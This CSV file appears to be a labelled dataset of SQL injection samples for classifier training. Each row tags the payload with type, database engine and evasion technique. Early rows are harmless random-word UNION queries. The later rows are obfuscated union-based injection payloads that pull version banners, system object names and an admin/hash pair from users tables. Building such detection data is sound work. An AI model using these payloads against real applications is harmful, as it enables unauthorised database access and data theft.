payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"SELECT news,parallel FROM away WHERE victory = 'little' UNION SELECT putting, applied FROM step",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT hearing FROM local UNION SELECT short FROM film ORDER BY show,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT tower FROM four UNION ALL SELECT stop FROM allow ORDER BY memory,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT bad,raw FROM spread WHERE current = 'thank' UNION SELECT subject, grow FROM parts",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT plus FROM plural UNION SELECT education FROM opposite ORDER BY shinning,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT too FROM particularly UNION ALL SELECT bit FROM plan ORDER BY nature,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT pond,row FROM native WHERE hold = 'threw' UNION SELECT buffalo, force FROM she",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT comfortable FROM zoo UNION SELECT allow FROM life ORDER BY fed,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT church FROM field UNION ALL SELECT model FROM watch ORDER BY joy,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT arrangement,worse FROM soft WHERE wrong = 'wet' UNION SELECT rubbed, appearance FROM through",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT about FROM together UNION SELECT tool FROM opinion ORDER BY series,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT smaller FROM please UNION ALL SELECT weather FROM pattern ORDER BY course,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT coffee,band FROM tonight WHERE willing = 'sale' UNION SELECT merely, carbon FROM extra",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT then FROM upper UNION SELECT double FROM army ORDER BY strong,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT quietly FROM where UNION ALL SELECT short FROM went ORDER BY caught,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT more,wide FROM trade WHERE kids = 'begun' UNION SELECT along, grown FROM roll",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT fallen FROM cell UNION SELECT rock FROM actual ORDER BY everyone,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT engine FROM began UNION ALL SELECT jet FROM chamber ORDER BY log,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT create,bottom FROM pretty WHERE familiar = 'play' UNION SELECT tower, opinion FROM go",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT band FROM pink UNION SELECT throw FROM essential ORDER BY lying,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT stepped FROM necessary UNION ALL SELECT suppose FROM start ORDER BY lead,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT leaf,did FROM leave WHERE creature = 'whole' UNION SELECT nor, before FROM written",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT two FROM snake UNION SELECT describe FROM gun ORDER BY here,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT physical FROM mix UNION ALL SELECT safety FROM frog ORDER BY prepare,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT call,fear FROM gate WHERE get = 'cutting' UNION SELECT terrible, keep FROM underline",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT applied FROM brief UNION SELECT voice FROM sets ORDER BY average,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT heat FROM sang UNION ALL SELECT hour FROM sky ORDER BY promised,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT evening,money FROM hair WHERE contrast = 'am' UNION SELECT vegetable, anything FROM company",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT depth FROM simple UNION SELECT stared FROM horse ORDER BY thought,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT move FROM compound UNION ALL SELECT badly FROM dawn ORDER BY frog,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT strong,degree FROM shut WHERE specific = 'chest' UNION SELECT gun, traffic FROM won",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT kind FROM avoid UNION SELECT hurt FROM fastened ORDER BY fort,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT hall FROM means UNION ALL SELECT connected FROM chart ORDER BY similar,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT examine,judge FROM position WHERE book = 'deep' UNION SELECT poetry, skin FROM school",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT month FROM pride UNION SELECT safety FROM push ORDER BY managed,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT account FROM come UNION ALL SELECT expect FROM like ORDER BY barn,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT made,symbol FROM month WHERE ran = 'ill' UNION SELECT try, month FROM death",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT although FROM order UNION SELECT over FROM single ORDER BY third,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT sugar FROM imagine UNION ALL SELECT pull FROM composition ORDER BY die,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT got,author FROM might WHERE sand = 'journey' UNION SELECT including, hard FROM letter",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT brought FROM title UNION SELECT bigger FROM loose ORDER BY period,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT consonant FROM numeral UNION ALL SELECT least FROM particular ORDER BY funny,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT canal,nose FROM empty WHERE plastic = 'eleven' UNION SELECT steep, cattle FROM heart",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT foot FROM uncle UNION SELECT given FROM tales ORDER BY out,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT trick FROM fear UNION ALL SELECT tall FROM science ORDER BY spread,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT sheet,human FROM lunch WHERE apartment = 'unless' UNION SELECT accurate, coat FROM unknown",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT farm FROM back UNION SELECT were FROM band ORDER BY ran,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT try FROM ball UNION ALL SELECT anyway FROM stock ORDER BY yourself,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT somebody,sell FROM smaller WHERE ride = 'want' UNION SELECT held, during FROM gather",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT rabbit FROM plant UNION SELECT kids FROM stuck ORDER BY follow,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT baseball FROM teacher UNION ALL SELECT yellow FROM does ORDER BY without,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT circus,properly FROM alive WHERE slowly = 'stopped' UNION SELECT hundred, children FROM sail",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT being FROM call UNION SELECT himself FROM taken ORDER BY income,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT opinion FROM difficult UNION ALL SELECT see FROM court ORDER BY realize,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT pet,buried FROM ride WHERE anyone = 'wonder' UNION SELECT leaf, interest FROM bridge",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT symbol FROM variety UNION SELECT repeat FROM make ORDER BY travel,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT try FROM load UNION ALL SELECT nervous FROM making ORDER BY solid,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT labor,needed FROM asleep WHERE current = 'leather' UNION SELECT growth, ran FROM actual",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT recall FROM separate UNION SELECT heavy FROM dear ORDER BY nearby,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT zero FROM write UNION ALL SELECT future FROM police ORDER BY aid,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT do,fort FROM know WHERE sitting = 'fallen' UNION SELECT during, plane FROM pencil",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT unit FROM meet UNION SELECT notice FROM including ORDER BY specific,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT show FROM greatly UNION ALL SELECT view FROM red ORDER BY planet,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT direction,engine FROM kitchen WHERE want = 'yes' UNION SELECT shut, even FROM behavior",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT come FROM realize UNION SELECT instrument FROM fly ORDER BY sell,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT goose FROM than UNION ALL SELECT cent FROM dull ORDER BY skin,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT travel,fog FROM manner WHERE ruler = 'search' UNION SELECT bow, mud FROM easily",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT younger FROM interior UNION SELECT outside FROM past ORDER BY complex,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT machine FROM pay UNION ALL SELECT mixture FROM ship ORDER BY fifty,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT dangerous,pretty FROM freedom WHERE loud = 'badly' UNION SELECT apartment, office FROM light",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT sure FROM silent UNION SELECT sides FROM excellent ORDER BY wing,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT brave FROM tongue UNION ALL SELECT ought FROM business ORDER BY specific,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT rule,cave FROM agree WHERE naturally = 'package' UNION SELECT specific, remain FROM paragraph",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT tears FROM people UNION SELECT aware FROM directly ORDER BY settle,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT president FROM any UNION ALL SELECT this FROM sunlight ORDER BY driver,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT my,spoken FROM record WHERE music = 'cross' UNION SELECT lion, make FROM tight",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT movement FROM fuel UNION SELECT boat FROM wool ORDER BY positive,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT wrong FROM than UNION ALL SELECT steam FROM send ORDER BY porch,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT fed,kill FROM flew WHERE wing = 'pile' UNION SELECT larger, fireplace FROM dry",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT swimming FROM explore UNION SELECT therefore FROM hungry ORDER BY base,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT religious FROM vegetable UNION ALL SELECT again FROM paper ORDER BY dark,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT felt,seen FROM away WHERE fur = 'lie' UNION SELECT enemy, charge FROM become",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT steep FROM pound UNION SELECT rule FROM floor ORDER BY sentence,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT third FROM dozen UNION ALL SELECT wonderful FROM opportunity ORDER BY welcome,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT asleep,hat FROM vast WHERE typical = 'his' UNION SELECT using, whenever FROM meal",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT lost FROM refused UNION SELECT sad FROM mill ORDER BY careful,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT knew FROM basket UNION ALL SELECT impossible FROM heading ORDER BY announced,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT school,frighten FROM furniture WHERE path = 'needed' UNION SELECT century, secret FROM bet",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT especially FROM hello UNION SELECT composition FROM environment ORDER BY block,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT fell FROM single UNION ALL SELECT crew FROM stomach ORDER BY aboard,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT himself,fresh FROM unhappy WHERE course = 'giving' UNION SELECT threw, few FROM thumb",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT season FROM book UNION SELECT out FROM pattern ORDER BY naturally,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT television FROM previous UNION ALL SELECT fifteen FROM jar ORDER BY equal,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT perhaps,point FROM syllable WHERE sleep = 'dog' UNION SELECT anywhere, you FROM grandfather",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT flow FROM beneath UNION SELECT composition FROM shelf ORDER BY clearly,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT active FROM bottle UNION ALL SELECT hit FROM twice ORDER BY it,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT hot,valley FROM voyage WHERE north = 'smallest' UNION SELECT direct, hurried FROM rough",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
SELECT is FROM pleasant UNION SELECT careful FROM month ORDER BY rocky,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
SELECT up FROM recently UNION ALL SELECT thank FROM tip ORDER BY pack,union_based,unknown,case_variation,0.8,rule,sqliv3_csv,order_by
"SELECT corner,grandfather FROM whispered WHERE behavior = 'income' UNION SELECT slowly, frog FROM greatly",union_based,unknown,case_variation,0.8,rule,sqliv3_csv,unknown
"sElect * FrOM userS WhERe id='9' oR.@ @(sElect (SeLecT (SeLecT (SeLECt 1))))&/*S7;t*/= 1 UnioN SeLEct (SELECT (SELECT 1)),vERSiOn: ( ) AND '5' not Like '0x7;' aNd TRUe Or fAlSE'anD ""&"" lIKe ""&"" OR False -- 1'A{3F",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"sEleCT * frOM/**/usErS whERE/*DnPD;R*/Id=(seLEct (sElect (SELECT (SELECT 1)))) Or (sElECt 0X1) Or fAlSE Or FaLSE OR ""He"" NOT LIKE ""He"" OR False#"" ( UNioN SelECT (SeLEcT 0b1),vERSION ( :), -- 0x0x",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"_SElect * FRom<uSERS WheRe id LIKE '8X4o9b0b10' OR } oR (>/(SELect (SEleCT (selEcT (sEleCt (SELECT (SELECT 0)))))) LIke 0x0X6B9 unIon SElEct 0x0x0x0b270,vErsiOn ( [ ) ?&oR "":"" NOT Like "":"" && ^TrUe or fALSE~-- 1'-Y7&]",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,string_single_quote
"SeleCT * FrOM[USErs whERe{Id_ LIKe ` '1' OR \.<\;uNION sElEcT 6x8,@@vERSioN[ ANd 0o7X4 Or faLse oR#fALse AND{(seLeCt 6x1f81) <> (seLECt (select 4xfDe)) -- 1'OmW",union_based,mssql,case_variation,0.46,rule,sqliv5_json,string_single_quote
"SELECt}(Qv q*/FrOm]uSeRS wHeRe Id='5b0xa' %!<@ uNiOn seLecT 3O1O5,vErsION% (/**/ ) aNd TRUe> && :tRUE?ANd (sELect 0x0o0O0x0O6) oR (SeLEct (sElECt (SeLeCt (SELECT 0)))) oR FalsE -- 0'Emv. U",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"sELEcT * FrOm uSeRS where Id\! LIKe '2' Or;@ @9B2 likE/ (SELEcT 0X0x1) UNIOn sElecT (SeLect 0O2o1),verSIOn ( ) ~or FAlSe OR FALSe|and tRUe And TRue[ AND '2f' NoT LIKe '6F(' &&\(SelecT (sEleCT (SelECt (sEleCt (SELECT 2))))) -- 1'9Zl2#",union_based,unknown,case_variation|function_alternative,0.8,rule,sqliv5_json,unknown
"@sELeCT *\frOm USers WhERe ID lIke= 4X0B0o1 Or 1x1 OR False#"" ( UNion selEct&(seLeCt (SelEct (seLECt (seleCT 1)))),versiON ( ! ) -- 7N6M",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"SELeCt * fRoM USers wHERE]iD =! '8' ||) oR /(sELeCt (sELEct;(sELect (SELect 1))))"" = |0X1}UNioN seLECT 6O0o1X2,VERSIOn ( +And ""l""=""l""$Or (SELect 4) oR:""h "" not LIKe oR 0X0 OR FALSE or FAlse Or FaLSe#""h ""# ) --)3O4'RG,P^C",union_based,unknown,case_variation,0.8,rule,sqliv5_json,string_double_quote
":selecT}* froM UseRs WHere Id = '0o1' Or \.<\ UnIoN-sElEcT 5x1,@@VERSIon or faLSe ;oR 0b8X0 && TRue aNd 'd'='D'~OR (seleCT (SELECT (SELECT (SELECT 7)))) or ""ZA "" NoT likE ""zA "" OR False -- 0'",union_based,mssql,case_variation|function_alternative,0.41,rule,sqliv5_json,string_double_quote
"SeLect * FroM>UseRs wHEre^Id lIKE '7' unIon Select OR /(SELeCt 8),veRSIoN ( ) /*Mk~yoL*/or (SeLeCT 0X0o0) Or fALSe && ""qht)""=""qHT)"" OR (seLecT 0x13b1) NOT LIke (SElEct (selECT (SElECt 6046))) AnD tRuE anD TRuE --(9'x\BXK",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
"\select * frOM UserS WHere}oR FaLsE OR ^False OR False#ID{ lIkE /'0b0o4'>UnIoN;SeLecT +\.,@@VErsIon oR (sELect 0o6)[-- 3O0B0o8'&l",union_based,mssql,case_variation,0.46,rule,sqliv5_json,unknown
"selEct * FroM/*~;y*/USeRs!wheRe;Id LIKE (seleCt (seleCt (SELECT 9))) <@&@ uNION SELeCt 0o7,VeRSIon () ) anD!(SEleCT (seLect 1))< AnD 'd""O'='D""o' anD 1 or 9883 NoT LIkE 0x25d3 or false -- 0X0o1;?Qw",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.7,rule,sqliv5_json,unknown
"=SELecT\*,fRom uSERs WHeRE>Id~lIKE?'4'/*){N;aH2Dxed>*/uNion.sELecT{$*$,@@VERsIOn/* E.@jdf/lOjm8ZJq+] Z;kxa*/aND_TRUe$&&,trUe<-- 0x0b0O0b1010o2O0o7'`.7B1271",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"seLect *?FRoM$UsErS WHerE iD LiKE *'0o0b1'~or+$ (sELect (SELECT 1)) =_ 0x0x9=UNIon selEcT (seleCt`(SelECT@1)),@@versIon OR 0O0x0/*4hxTNF?TYZ*/ Or %(selecT (SeLect (SELECT 3004)))? LIke (selecT 0xbD0x5O3) or false? Or FalSe or ""[]"" not = ""[]"" OR False -- 9o2'S #l~5f",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,string_double_quote
"-SelEct/* t(4VS9LIZ]'{ S*/* FroM uSErS whERe ID =('4o0O0x1'-or \<\-UNion SeLeCt (SElECT.(sELECT (SelEcT (sElECt (SELeCT 3))))),@@VERSioN && TRUe{ oR\ (Select 0x0) )Or 'E' NoT = 'E' oR fALSe OR (selecT 0) aND 1 OR False -- 4'JH:gj",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,numeric
"SeleCT *#frOM uSeRs WhERe iD {=`|(sELEcT 1) UNiON selECT (SELECt (sElect 0o2)) OR 0b1,vErSiON> ( ) ---0i=",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"Select * fRoM uSERS wHeRE Id = (select (SEleCt 5)) || 1 unIOn SEleCt&NuLL,BanNer from v$VErSion whErE ROWNuM = (select (SeLEcT 1)) -- (SELECT 3)/k",union_based,oracle,case_variation,0.46,rule,sqliv5_json,unknown
"sELeCt * From uSErs wHeRe iD LIKE (SeleCT (SElEcT (SelecT-0x1))) + ( 0x3 ) UnIOn SEleCt|null,bANNER from V$vErsIoN wHere ROwNum =/*MO*/ (SelEct 0x0) -- 0O5o4o10`t",union_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"sElecT * FroM userS wherE id = '2' uNIon SElECt ( \. ^) ~,@@veRSion AnD)tRuE ; AND truE OR 0x5B NOT=(SelECt (SeLECt 0o63)) && TruE -- 6X0B201'hjgIi`v:",union_based,mssql,case_variation,0.46,rule,sqliv5_json,unknown
"SELECT{*?frOM uSERs WherE Id:= 0o8 or 0o0x8X0B83X0x2] && ""Zt"""" noT LIkE ""zT""}"" and 9X16Cb NoT LiKe (SelEcT 0X96Cc) or)falSe Or FAlsE oR (SeLECT (SELECT 0)) and (SeleCT 0o1) or FaLSe#"".;uNion`sEleCt null,veRsion *(; ) +-- 0X0xf2CfKa Ix",union_based,unknown,case_variation|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"sElECt * fRom USerS WHERE/**/Id Like 0X9 UNiON select 1,bANnER FROM v$vErsion WHerE RoWnum LIkE (SELECT 1) oR FAlse or falSe OR FALSE -- 1RE",union_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"(SELeCT * fRoM(uSerS wHERe'ID=0O0o6 UniON}sELECT/**/@`$_,VeRsIoN *(. ; )+<_OR '7'='7o7b7X6X0o1762C'{Or$FaLsE --}0xbgnx5?]",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"/* X9**/select * FRom USErs_wHeRE ID = 0X0b1 + $+*$ uNioN SeLecT NULL,@@VErSIoN Or fAlse Or 0x0 OR (seLEct (seLECT (SeleCT 9105)))=0X23BE oR FALsE aND (sELeCT (SelECt 1)) Or FAlSE --`0i",union_based,mssql,case_variation|inline_comment,0.46,rule,sqliv5_json,unknown
"seLeCt * froM UsERs wHErE ID LIKE ;0x3X1.<@$ UniOn seLect (sELECT)(SELECT (SELECT 6x5))),VersION ( /**/ ) aNd '['='['(oR{fAlse OR fAlSe or 0b1001x0;-- 0B1|8:",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.7,rule,sqliv5_json,unknown
"SElEct_* fRoM usErs WHerE ID!='6O5 *0X1 UNION selEcT nuLL,bANneR FroM V$VerSION wheRe rowNUm LiKe- (sELeCt 0O1) oR_""@"" NoT lIke ""@"" oR (SEleCT 4o0) aND TruE : OR! ""Bpy"" nOt lIKE ""bpy"" anD True oR (SELECT (SELECT 4002))!=0XFA0o2 aNd ""EdJ""!=""edJR"" OR falsE Or FALSe OR 0x0 -- 8bY)",union_based,oracle,case_variation|function_alternative,0.46,rule,sqliv5_json,string_double_quote
"1/*)Vrpr3NPK*/unIon AlL sELEct (SeLEct 0o1),(sElEcT}(select 2)),0x3,(SELeCt 1),(SEleCt 0b851),0X2,NAME FRom sySObjeCts WhEre`xTYpE ?likE And truE Or '&M('='&M(6' aND+TrUe;Or (SeLect (seLEcT 0)) ANd tRUe or<falsE oR FaLSE and 1 And trUe# 'U' OR 0x1O0O0b0b0'--0X9ENlbnh@%:",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.7,rule,sqliv5_json,string_single_quote
"sELecT * fROM uSErs whErE;id LiKE 4 oR (SEleCt 2X4)[&& (SELECT 1) oR falSe#"". uNiOn SElect 'A',VeRsIoN (= ) -- 0",union_based,unknown,case_variation,0.8,rule,sqliv5_json,unknown
"sELECT * FrOM USErs whErE iD LIkE ;0o0o10X3 oR (SELECT 8) Or fALSe OR&(SELECT 0) OR False#""; UnIoN select NULL,VERSIoN ( ) --/**/3B%[p""}<",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"$SEleCt * FrOm USErS wHERe ID$ = 7 *(sELeCt 0x5) uNIOn seLEct (SELECT 1),bANner froM V$VerSIOn wHeRE RownUm =` 6 OR ""3""=""4)"" AND ""Y>""<>""Y>H"" OR False --$0O1",union_based,oracle,case_variation,0.46,rule,sqliv5_json,string_double_quote
"sELECt * FRom uSeRs WhERe iD""= '0' UniON SelEct ( ;\ ) ?,@@VErSion OR + ""_""=""_q"" oR FaLsE OR False && ""Bfvsi""<>""Bfvsim"" -- 0o4')Z",union_based,mssql,case_variation,0.46,rule,sqliv5_json,string_double_quote
"sELECT *'fROM uSeRS wHere iD LiKE 0X1X6 oR (SeLEct 0X1) aNd: 0x3b0 nOt LikE (selecT (Select (sEleCt (SeLeCT (SelEcT (sELeCT (sELEcT 781))))))) And tRue aNd ""m""!=""m,"" aND tRUE/**/And 9x1 anD (SELECt 1) Or 'Q '!='Q ' Or fAlSE#""$ UNIoN/*&kE.]*RI`*/sELecT (SElEcT (SeLecT 0x0X2)),verSIon ( ) [:-- 3Prx",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"SeLecT * FroM USErS wHERE!ID lIkE (SElect (SelECt 0X0)) oR 0x1 and (SELECt (SELECT (SELECT 1)))#""{~uNioN SeleCT NuLl,vErsIoN ( + ,)/**/ --/**/0x4uzS",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"0B10011001110 ""! AnD: 0x0o0O9O1/** X0x6cCJiP*/ lIkE/*(sELECT 76)*/ (SELeCt (SeleCt:0X9)) unIoN All select/""ADMin"", ""81dc9bDB52D4dc24036DbD8313ED965",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"sEleCt */**/fRoM usErs wHeRE Id LIKE (select 0O0B1001) or (sELEct 1) aNd TRUe Or faLSe OR fALSe OR ""&!J&"" nOt lIkE ""&!j&"" AND True#""; } liKE. (SelecT (SElecT 0x1)) UNIon/**/SELecT 0O1,verSIon %( ) * -- 5W=",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"""sELEcT * FRoM UseRs wHErE iD *= '2' uNIOn/* EO */SELEct !<@,VErsiOn^ ( - ) and ~ 0XC25!=(SELECT (sELEcT (sElect[0X0B10111Bd))) or ""SP"" liKe ""spA"" and ""3x8}"" Not liKe ""8}\"" or faLSe anD*""im"" NOt lIKE ""imj"" or fALSe aNd ""g""<>""gy"" OR faLse oR fAlsE oR falSE aND true -- 1'`?S+",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"seLeCt}* fRoM!USeRS whErE Id ?, lIkE 0B0X1B9X1 or $+<(SELect 0x1) uniON seLeCt (SeLEcT (SelecT (selECT 1))),@@veRSION?%or/**/-0X0 and TRUE||0x9B3B20 <> (sELEct (SELECt 2482))=aNd TrUE AnD 0X1 aNd tRUe OR False --@4o7Uh@[",union_based,mssql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
